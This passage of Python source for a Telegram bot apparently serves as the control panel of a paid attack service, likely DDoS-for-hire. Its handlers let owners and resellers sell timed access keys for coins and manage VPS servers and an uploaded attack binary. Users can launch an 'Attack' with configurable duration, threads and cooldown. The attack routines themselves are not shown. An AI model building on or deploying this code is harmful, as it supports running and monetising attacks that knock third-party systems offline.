            reply_markup=owner_menu_markup
        )
    else:
        await update.message.reply_text(
            f"📋 *Co-Owner Menu* - Select an option:\n\n",
            parse_mode='Markdown',
            reply_markup=co_owner_menu_markup
        )
    return MENU_SELECTION

async def back_to_home(update: Update, context: CallbackContext):
    if is_owner(update):
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"🏠 *Returned to main menu*\n\n",
            parse_mode='Markdown',
            reply_markup=owner_markup
        )
    elif is_co_owner(update):
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"🏠 *Returned to main menu*\n\n",
            parse_mode='Markdown',
            reply_markup=co_owner_markup
        )
    return ConversationHandler.END

async def reseller_status_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can check reseller status!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter reseller's username or ID to check status:*\n\n",
        parse_mode='Markdown'
    )
    return GET_RESELLER_INFO

async def reseller_status_info(update: Update, context: CallbackContext):
    input_text = update.message.text.strip()
    
    try:
        # Try to get user by ID
        user_id = int(input_text)
        try:
            user = await context.bot.get_chat(user_id)
        except Exception as e:
            logging.error(f"Error getting user by ID: {e}")
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        # Try to get user by username
        if not input_text.startswith('@'):
            input_text = '@' + input_text
        try:
            user = await context.bot.get_chat(input_text)
            user_id = user.id
        except Exception as e:
            logging.error(f"Error getting user by username: {e}")
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    
    if user_id not in resellers:
        await update.message.reply_text("❌ *This user is not a reseller!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    try:
        # Calculate generated keys
        generated_keys = 0
        for key, info in keys.items():
            if info['generated_by'] == user_id:
                generated_keys += 1
        for key, info in special_keys.items():
            if info['generated_by'] == user_id:
                generated_keys += 1
        
        balance = reseller_balances.get(user_id, 0)
        
        # Escape username for Markdown
        username = escape_markdown(user.username, version=2) if user.username else 'N/A'
        
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        message_text = (
            f"📊 *Reseller Status*\n\n"
            f"👤 *Username:* @{username}\n"
            f"🆔 *ID:* `{user_id}`\n"
            f"💰 *Balance:* {balance} coins\n"
            f"🔑 *Keys Generated:* {generated_keys}\n\n"
        )
        
        # Split message if too long (though this one shouldn't be)
        if len(message_text) > 4000:
            part1 = message_text[:4000]
            part2 = message_text[4000:]
            await update.message.reply_text(part1, parse_mode='Markdown')
            await update.message.reply_text(part2, parse_mode='Markdown')
        else:
            await update.message.reply_text(
                message_text,
                parse_mode='Markdown',
                reply_markup=owner_menu_markup if is_owner(update) else co_owner_menu_markup
            )
    except Exception as e:
        logging.error(f"Error in reseller_status_info: {e}")
        await update.message.reply_text(
            "❌ *An error occurred while processing your request.*",
            parse_mode='Markdown'
        )
    
    return MENU_SELECTION

async def add_co_owner_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add co-owners!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter the user ID of the co-owner to add.*\n\n",
        parse_mode='Markdown'
    )
    return GET_ADD_CO_OWNER_ID

async def add_co_owner_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id not in CO_OWNERS:
            CO_OWNERS.append(user_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Co-owner with ID {user_id} added successfully!*\n\n"
                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"ℹ️ *User ID {user_id} is already a co-owner.*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def remove_co_owner_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove co-owners!*", parse_mode='Markdown')
        return ConversationHandler.END

    if not CO_OWNERS:
        await update.message.reply_text("❌ *There are no co-owners to remove!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter the user ID of the co-owner to remove.*\n\n"
        f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
        parse_mode='Markdown'
    )
    return GET_REMOVE_CO_OWNER_ID

async def remove_co_owner_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in CO_OWNERS:
            CO_OWNERS.remove(user_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Co-owner with ID {user_id} removed successfully!*\n\n"
                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS) if CO_OWNERS else 'None'}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"❌ *User ID {user_id} is not a co-owner!*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def set_display_name_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can set display name!", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Check if we're in a group
    if update.effective_chat.type in ['group', 'supergroup']:
        context.user_data['setting_group_name'] = update.effective_chat.id
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"⚠️ Enter the new display name for this group (current: {current_display_name}):\n\n",
            parse_mode='Markdown'
        )
    else:
        # In private chat, ask which group to set
        context.user_data['setting_group_name'] = None
        current_display_name = get_display_name(None)
        
        await update.message.reply_text(
            f"⚠️ Please enter the group ID you want to set the display name for (or 'default' for default name):\n\n",
            parse_mode='Markdown'
        )
    return GET_DISPLAY_NAME

async def set_display_name_input(update: Update, context: CallbackContext):
    if 'setting_group_name' not in context.user_data:
        await update.message.reply_text("❌ Error: Missing context data", parse_mode='Markdown')
        return ConversationHandler.END
    
    group_id = context.user_data['setting_group_name']
    new_name = update.message.text
    
    if group_id is None:
        # We're in private chat and need to get the group ID
        if new_name.lower() == 'default':
            group_id = None
        else:
            try:
                group_id = int(new_name)
                # Verify this is a valid group ID
                if group_id not in ALLOWED_GROUP_IDS:
                    await update.message.reply_text(
                        "❌ This group ID is not in the allowed list!",
                        parse_mode='Markdown'
                    )
                    return ConversationHandler.END
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid group ID! Please enter a numeric group ID or 'default'",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        # Now ask for the actual display name
        context.user_data['setting_group_name'] = group_id
        current_display_name = get_display_name(group_id)
        
        await update.message.reply_text(
            f"⚠️ Now enter the display name you want to set (current: {current_display_name}):\n\n",
            parse_mode='Markdown'
        )
        return GET_DISPLAY_NAME
    else:
        # We have the group ID, set the name
        await set_display_name(update, new_name, group_id)
        return ConversationHandler.END

async def show_uptime(update: Update, context: CallbackContext):
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    uptime = get_uptime()
    
    await update.message.reply_text(
        f"⏳ *Bot Uptime:* {uptime}\n\n",
        parse_mode='Markdown'
    )

async def settings_menu(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can access settings!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚙️ *Settings Menu*\n\n",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )
    return MENU_SELECTION

async def co_owner_management(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only the owner can manage co-owners!*",
            parse_mode='Markdown',
            reply_markup=settings_markup
        )
        return
    
    await update.message.reply_text(
        "👥 *Co-Owner Management*\n\n"
        "Use these commands:\n"
        "/addcoowner - Add a co-owner\n"
        "/removecoowner - Remove a co-owner",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )

async def handle_button_click(update: Update, context: CallbackContext):
    chat = update.effective_chat
    query = update.message.text

    if chat.type == "private" and not is_authorized_user(update):
        image = get_random_start_image()
        current_display_name = get_display_name(None)
        
        await update.message.reply_photo(
            photo=image['url'],
            caption=f"❌ *This bot is not authorized to use here.*\n\n",
            parse_mode='Markdown'
        )
        return

    if query == 'Start':
        await start(update, context)
    elif query == 'Attack':
        await attack_start(update, context)
    elif query == 'Set Duration':
        await set_duration_start(update, context)
    elif query == 'Settings':
        await settings_menu(update, context)
    elif query == 'Co-Owner':
        await co_owner_management(update, context)
    elif query == 'Set Threads':
        await set_threads_start(update, context)
    elif query == 'Generate Key':
        await generate_key_start(update, context)
    elif query == 'Redeem Key':
        await redeem_key_start(update, context)
    elif query == 'Keys':
        await show_keys(update, context)
    elif query == 'Delete Key':
        await delete_key_start(update, context)
    elif query == 'Add Reseller':
        await add_reseller_start(update, context)
    elif query == 'Remove Reseller':
        await remove_reseller_start(update, context)
    elif query == 'Add Coin':
        await add_coin_start(update, context)
    elif query == 'Balance':
        await balance(update, context)
    elif query == 'Rules':
        await rules(update, context)
    elif query == 'Set Cooldown':
        await set_cooldown_start(update, context)
    elif query == '🔍 Status':
        await check_key_status(update, context)
    elif query == 'OpenBot':
        await open_bot(update, context)
    elif query == 'CloseBot':
        await close_bot(update, context)
    elif query == '🔑 Special Key':
        await generate_special_key_start(update, context)
    elif query == 'Menu':
        await show_menu(update, context)
    elif query == 'Back to Home':
        await back_to_home(update, context)
    elif query == 'Add Group ID':
        await add_group_id_start(update, context)
    elif query == 'Remove Group ID':
        await remove_group_id_start(update, context)
    elif query == 'RE Status':
        await reseller_status_start(update, context)
    elif query == 'VPS Status':
        await show_vps_status(update, context)
    elif query == 'Add VPS':
        await add_vps_start(update, context)
    elif query == 'Remove VPS':
        await remove_vps_start(update, context)
    elif query == 'Upload Binary':
        await upload_binary_start(update, context)
    elif query == 'Add Co-Owner':
        await add_co_owner_start(update, context)
    elif query == 'Remove Co-Owner':
        await remove_co_owner_start(update, context)
    elif query == 'Set Display Name':
        await set_display_name_start(update, context)
    elif query == 'Reset VPS':
        await reset_vps(update, context)
    elif query == '⏳ Uptime':
        await show_uptime(update, context)
    elif query == '⚙️ Owner Settings':
        await owner_settings(update, context)

async def cancel_conversation(update: Update, context: CallbackContext):
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        "❌ *Current process canceled.*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def check_expired_keys(context: CallbackContext):
    current_time = time.time()
    expired_users = []
    
    for user_id, key_info in redeemed_users.items():
        if isinstance(key_info, dict):
            if key_info['expiration_time'] <= current_time:
                expired_users.append(user_id)
        elif isinstance(key_info, (int, float)) and key_info <= current_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del redeemed_users[user_id]

        expired_keys = [key for key, info in redeemed_keys_info.items() if info['redeemed_by'] == user_id]
        for key in expired_keys:
            del redeemed_keys_info[key]

    save_keys()
    logging.info(f"Expired users and keys removed: {expired_users}")

def main():
    # Declare globals first
    global TELEGRAM_BOT_TOKEN, OWNER_USERNAME
    
    # Load configurations
    load_keys()
    load_vps()
    load_display_name()

    # Create the Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Check if running as specific bot instance
    if len(sys.argv) > 1 and "--token" in sys.argv:
        token_index = sys.argv.index("--token") + 1
        owner_index = sys.argv.index("--owner") + 1
        
        if token_index < len(sys.argv) and owner_index < len(sys.argv):
            TELEGRAM_BOT_TOKEN = sys.argv[token_index]
            OWNER_USERNAME = sys.argv[owner_index]
            # Recreate application with new token
            application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add conversation handlers
    generate_key_handler = ConversationHandler(
        entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.Text("Generate Key"), generate_key_start)],
        states={
            GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    redeem_key_handler = ConversationHandler(
        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.Text("Redeem Key"), redeem_key_start)],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("Set Duration"), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    delete_key_handler = ConversationHandler(
        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
        states={
            GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("Add Reseller"), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("Add Coin"), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    special_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("🔑 Special Key"), generate_special_key_start)],
        states={
            GET_SPECIAL_KEY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_duration)],
            GET_SPECIAL_KEY_FORMAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_format)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add VPS handlers
    add_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add VPS"), add_vps_start)],
        states={
            GET_VPS_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_vps_info)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove VPS"), remove_vps_start)],
        states={
            GET_VPS_TO_REMOVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_vps_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    upload_binary_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Upload Binary"), upload_binary_start)],
        states={
            CONFIRM_BINARY_UPLOAD: [
                MessageHandler(filters.Document.ALL, upload_binary_confirm),
                MessageHandler(filters.TEXT & ~filters.COMMAND, lambda update, context: update.message.reply_text("❌ Please upload a file!", parse_mode='Markdown'))
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add co-owner handlers
    add_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Co-Owner"), add_co_owner_start)],
        states={
            GET_ADD_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_co_owner_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Co-Owner"), remove_co_owner_start)],
        states={
            GET_REMOVE_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_co_owner_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add display name handler
    display_name_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Set Display Name"), set_display_name_start)],
        states={
            GET_DISPLAY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_display_name_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add reseller status handler
    reseller_status_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("RE Status"), reseller_status_start)],
        states={
            GET_RESELLER_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, reseller_status_info)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add group ID handlers
    add_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Group ID"), add_group_id_start)],
        states={
            ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_id_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start)],
        states={
            REMOVE_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_group_id_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    add_bot_handler = ConversationHandler(
        entry_points=[CommandHandler("addbot", add_bot_instance)],
        states={
            GET_BOT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_bot_token)],
            GET_OWNER_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_owner_username)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add menu handler
    menu_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Menu"), show_menu)],
        states={
            MENU_SELECTION: [
                MessageHandler(filters.Text("Add Group ID"), add_group_id_start),
                MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start),
                MessageHandler(filters.Text("RE Status"), reseller_status_start),
                MessageHandler(filters.Text("VPS Status"), show_vps_status),
                MessageHandler(filters.Text("Add VPS"), add_vps_start),
                MessageHandler(filters.Text("Remove VPS"), remove_vps_start),
                MessageHandler(filters.Text("Upload Binary"), upload_binary_start),
                MessageHandler(filters.Text("Add Co-Owner"), add_co_owner_start),
                MessageHandler(filters.Text("Remove Co-Owner"), remove_co_owner_start),
                MessageHandler(filters.Text("Set Display Name"), set_display_name_start),
                MessageHandler(filters.Text("Back to Home"), back_to_home),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add settings menu handler
    settings_menu_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Settings"), settings_menu)],
        states={
            MENU_SELECTION: [
                MessageHandler(filters.Text("Set Duration"), set_duration_start),
                MessageHandler(filters.Text("Add Reseller"), add_reseller_start),
                MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start),
                MessageHandler(filters.Text("Set Threads"), set_threads_start),
                MessageHandler(filters.Text("Add Coin"), add_coin_start),
                MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start),
                MessageHandler(filters.Text("Reset VPS"), reset_vps),
                MessageHandler(filters.Text("Co-Owner"), co_owner_management),
                MessageHandler(filters.Text("Back to Home"), back_to_home),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add all handlers
    application.add_handler(generate_key_handler)
    application.add_handler(redeem_key_handler)
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(delete_key_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(special_key_handler)
    application.add_handler(add_vps_handler)
    application.add_handler(remove_vps_handler)
    application.add_handler(upload_binary_handler)
    application.add_handler(add_co_owner_handler)
    application.add_handler(remove_co_owner_handler)
    application.add_handler(display_name_handler)
    application.add_handler(reseller_status_handler)
    application.add_handler(add_group_id_handler)
    application.add_handler(remove_group_id_handler)
    application.add_handler(menu_handler)
    application.add_handler(settings_menu_handler)
    application.add_handler(add_bot_handler)
    application.add_handler(CommandHandler("listbots", show_bot_list))
    application.add_handler(CommandHandler("stopbot", stop_bot_instance))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

    application.run_polling()

if __name__ == '__main__':
    main()
    

    
